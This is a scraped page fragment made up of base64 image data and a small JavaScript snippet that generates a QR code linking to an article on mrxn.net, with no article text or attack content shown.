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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/bigant-plus\_get\_favicon-upload.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 